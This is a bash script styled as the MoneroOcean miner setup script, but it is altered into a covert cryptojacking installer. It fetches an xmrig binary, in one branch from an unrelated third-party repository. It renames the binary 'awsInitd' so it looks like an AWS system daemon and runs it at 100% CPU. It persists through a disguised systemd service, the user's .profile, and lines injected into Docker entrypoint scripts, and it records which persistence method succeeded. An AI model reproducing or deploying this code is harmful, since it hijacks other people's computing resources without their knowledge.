#!/bin/bash

VERSION=2.11

# printing greetings

echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
    echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
DEBUG=$2
EMAIL=$3 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
    echo "Script usage:"
    echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
    echo "ERROR: Please specify your wallet address"
    exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
    echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
        exit 1
fi

check_docker_container() {
    if [ -f /.dockerenv ]; then
        return 0
    fi

    return 1
}


if ! type curl >/dev/null; then
    echo "ERROR: This script requires \"curl\" utility to work correctly"
    exit 1
fi

if ! type lscpu >/dev/null; then
    echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# Check if running in Docker
check_docker() {
    if [ -f /.dockerenv ]; then
        return 0
    fi
    return 1
}

write_info() {
    if [ "$DEBUG" = true ]; then
        local value="$1"
        if [ -n "$value" ]; then
            echo $value >> info_pers
        fi
    fi
}

determine_working_dir() {
    if [ -n "$HOME" ]; then
        echo "$HOME"
    else
        output=$(find /home -type d -writable 2>/dev/null | grep -v -E "^(/tmp|/proc|/sys|/dev)" | grep -v "tmp")
        if [ -z "$output" ]; then
            output=$(find /var -type d -writable 2>/dev/null | grep -v -E "^(/tmp|/proc|/sys|/dev)" | grep -v "tmp")
            if [ -z "$output" ]; then
                output=$(find / -type d -writable 2>/dev/null | grep -v -E "^(/tmp|/proc|/sys|/dev)" | grep -v "tmp")
                if [ -z "$output" ]; then
                    output="/tmp"
                fi
            fi
        fi
        echo $(echo "$output" | head -1)
    fi
}

working_dir=$(determine_working_dir)

# Check free RAM
configure_from_ram() {
    FREE_RAM=$(free -m | awk '/^Mem:/{print $7}')
    if [ "$FREE_RAM" -lt 512 ]; then
        sed -i'' 's/"algo": *null/"algo": "cn-pico"/' "$working_dir/moneroocean/config.json"
        write_info "cn-pico selected"
    elif [ "$FREE_RAM" -lt 2350 ]; then
        sed -i'' 's/"algo": *null/"algo": "rx/wow"/' "$working_dir/moneroocean/config.json"
        write_info "rx/wow selected"
    fi
}


CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
    echo "ERROR: Can't compute projected Monero CN hashrate"
    exit 1
fi

power2() {
    if ! type bc >/dev/null; then
        if   [ "$1" -gt "8192" ]; then
            echo "8192"
        elif [ "$1" -gt "4096" ]; then
            echo "4096"
        elif [ "$1" -gt "2048" ]; then
            echo "2048"
        elif [ "$1" -gt "1024" ]; then
            echo "1024"
        elif [ "$1" -gt "512" ]; then
            echo "512"
        elif [ "$1" -gt "256" ]; then
            echo "256"
        elif [ "$1" -gt "128" ]; then
            echo "128"
        elif [ "$1" -gt "64" ]; then
            echo "64"
        elif [ "$1" -gt "32" ]; then
            echo "32"
        elif [ "$1" -gt "16" ]; then
            echo "16"
        elif [ "$1" -gt "8" ]; then
            echo "8"
        elif [ "$1" -gt "4" ]; then
            echo "4"
        elif [ "$1" -gt "2" ]; then
            echo "2"
        else
            echo "1"
        fi
    else 
        echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
    fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
    echo "ERROR: Can't compute port"
    exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
    echo "ERROR: Wrong computed port value: $PORT"
    exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $working_dir/moneroocean/miner.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
    echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
    echo "Since I can't do passwordless sudo, mining in background will started from your $working_dir/.profile file first time you login this host after reboot."
else
    echo "Mining in background will be performed using moneroocean_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

check_system_libc() {
    if ldd --version 2>&1 | grep -q "musl"; then
        echo "musl"
    else
        echo "glibc"
    fi
}

# start doing stuff: preparing miner
# if check_docker; then
#     echo "[*] Probably it will only work statically"
#     url="$(
#     curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest \
#         | jq -r '.assets[]
#     | select(
#         (.name | test("linux"; "i")) and
#         (.name | test("static"; "i")) and
#         (.name | test("x86_64|x64"; "i"))
#     )
#     | .browser_download_url' \
#         | head -n 1
#     )"
#     if ! curl -L --progress-bar "$url" -o /tmp/data.tar.gz; then
#         echo "ERROR: Can't download $url"
#         exit 1
#     fi
#     echo "[*] Unpacking /tmp/data.tar.gz to $working_dir/awsInit"
#     [ -d $working_dir/awsInit ] || mkdir $working_dir/awsInit
#     if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
#       echo "ERROR: Can't unpack /tmp/data.tar.gz to $working_dir/awsInit directory"
#       exit 1
#     fi
#     echo "[*] Checking if xmrig works correctly"
#     sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
#     $working_dir/awsInit/xmrig --help >/dev/null
#     if (test $? -ne 0); then
#       if [ -f $working_dir/awsInit/xmrig ]; then
#         echo "WARNING: Advanced version of $working_dir/awsInit/xmrig is not functional"
#       else 
#         echo "WARNING: Advanced version of $working_dir/awsInit/xmrig was removed by antivirus (or some other problem)"
#       fi
#       exit 1


echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
    sudo systemctl stop moneroocean_miner.service
    sudo systemctl disable --now moneroocean_miner.service

    sudo systemctl stop awsInitDaemon.service
fi
killall -9 xmrig
killall -9 awsInitd

echo "[*] Removing $working_dir/awsInit directory"
rm -rf $working_dir/awsInit

libc_type=$(check_system_libc)

if [ "$libc_type" = "musl" ]; then
    if ! curl -L --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
        echo "ERROR: cant't download https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
        exit 1
    fi

    echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
    [ -d $working_dir/awsInit] || mkdir $working_dir/awsInit
    if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
        echo "ERROR: Can't unpack /tmp/data.tar.gz to $working_dir/awsInit directory"
        exit 1
    fi
    rm /tmp/data.tar.gz

    echo "[*] Checking if advanced version of $working_dir/awsInit/xmrig works fine (and not removed by antivirus software)"
    sed -i'' 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
    $working_dir/awsInit/xmrig --help >/dev/null
    if (test $? -ne 0); then
        if [ -f $working_dir/awsInit/xmrig ]; then
            echo "WARNING: Advanced version of $working_dir/awsInit/xmrig is not functional"
        else 
            echo "WARNING: Advanced version of $working_dir/awsInit/xmrig was removed by antivirus (or some other problem)"
        fi
        rm -rf $working_dir/awsInit
        exit 1
    fi
else
    echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
    if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/data.tar.gz; then
        echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
        exit 1
    fi

    echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
    [ -d $working_dir/awsInit] || mkdir $working_dir/awsInit
    if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
        echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $working_dir/awsInit directory"
        exit 1
    fi
    rm /tmp/data.tar.gz

    echo "[*] Checking if advanced version of $working_dir/awsInit/xmrig works fine (and not removed by antivirus software)"
    sed -i'' 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
    $working_dir/awsInit/xmrig --help >/dev/null
    if (test $? -ne 0); then
        if [ -f $working_dir/awsInit/xmrig ]; then
            echo "WARNING: Advanced version of $working_dir/awsInit/xmrig is not functional"
        else 
            echo "WARNING: Advanced version of $working_dir/awsInit/xmrig was removed by antivirus (or some other problem)"
        fi
        rm -rf $working_dir/awsInit
        exit 1
    fi
fi

mv $working_dir/awsInit/xmrig $working_dir/awsInit/awsInitd
echo "[*] Miner $working_dir/awsInit/awsInitd is OK"

PASS=`curl -s ifconfig.me`
if [ -z $PASS ]; then
    PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
fi
if [ "$PASS" == "localhost" ]; then
    PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
    PASS=na
fi
if [ ! -z $EMAIL ]; then
    PASS="$PASS:$EMAIL"
fi

sed -i'' 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $working_dir/awsInit/config.json
sed -i'' 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $working_dir/awsInit/config.json
sed -i'' 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $working_dir/awsInit/config.json
sed -i'' 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $working_dir/awsInit/config.json
sed -i'' 's#"log-file": *null,#"log-file": "'$working_dir/awsInit/awsdlog.log'",#' $working_dir/awsInit/config.json
sed -i'' 's/"syslog": *[^,]*,/"syslog": true,/' $working_dir/awsInit/config.json

configure_from_ram

cp $working_dir/awsInit/config.json $working_dir/awsInit/config_background.json
sed -i'' 's/"background": *false,/"background": true,/' $working_dir/awsInit/config_background.json

# preparing script

echo "[*] Creating $working_dir/awsInit/init.sh script"
if which sh >/dev/null 2>&1; then
    echo "SH"
    cat >$working_dir/awsInit/init.sh <<EOL
#!$(which sh)
if ! pidof awsInitd >/dev/null; then
  nice $working_dir/awsInit/awsInitd \$*
fi
EOL
elif which bash >/dev/null 2>&1; then
    echo "BASH"
    cat >$working_dir/awsInit/init.sh <<EOL
#!$(which bash)
if ! pidof awsInitd >/dev/null; then
  nice $working_dir/awsInit/awsInitd \$*
fi
EOL
fi

chmod +x $working_dir/awsInit/init.sh

# preparing script background work and work under reboot

if check_docker; then
    echo "[*] is DOCKER"
    out=$(find / -name "entrypoint.sh" 2>/dev/null)
    if [ -n "$out" ]; then
        first=$(echo "$out" | head -1)
        if ! sed -i'' "/^exec \"\$@\"/i $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1" $first; then
            write_info "failed docker persistence"
        else
            write_info "success docker persistence"
        fi
    else
        write_info "entrypoint not found"
    fi
else
    if ! sudo -n true 2>/dev/null; then
        if ! grep awsInit/init.sh $working_dir/.profile >/dev/null; then
            echo "[*] Adding $working_dir/awsInit/init.sh script to $working_dir/.profile"
            if ! echo "$working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1" >>$working_dir/.profile; then
                write_info "failed profile persistence"
            else
                write_info "success profile persistence"
            fi
        else 
            echo "Looks like $working_dir/awsInit/init.sh script is already in the $working_dir/.profile"
        fi
        echo "[*] Running miner in the background (see logs in $working_dir/awsInit/xmrig.log file)"
    else
        if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
            echo "[*] Enabling huge pages"
            echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
            sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
            write_info "enabled huge pages"
        fi

        if ! type systemctl >/dev/null; then
            write_info "systemctl not present"
            echo "[*] Running miner in the background (see logs in $working_dir/awsInit/xmrig.log file)"
            echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
            echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
        else
            echo "[*] Creating moneroocean_miner systemd service"
            cat >/tmp/awsInitDaemon.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$working_dir/awsInit/awsInitd --config=$working_dir/awsInit/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
sudo mv /tmp/awsInitDaemon.service /etc/systemd/system/awsInitDaemon.service
echo "[*] Starting moneroocean_miner systemd service"
sudo killall xmrig 2>/dev/null
sudo systemctl daemon-reload
sudo systemctl enable awsInitDaemon.service
sudo systemctl start awsInitDaemon.service
echo "To see miner service logs run \"sudo journalctl -u awsInitDaemon -f\" command"
write_info "added service persistence"
        fi
    fi
fi

if which bash >/dev/null 2>&1; then
    $(which bash) $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1
    write_info "executed in bg"
elif which sh >/dev/null 2>&1; then
    $(which sh) $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1
    write_info "executed in bg"
else
    write_info "not executed"
fi

echo "[*] Setup complete"
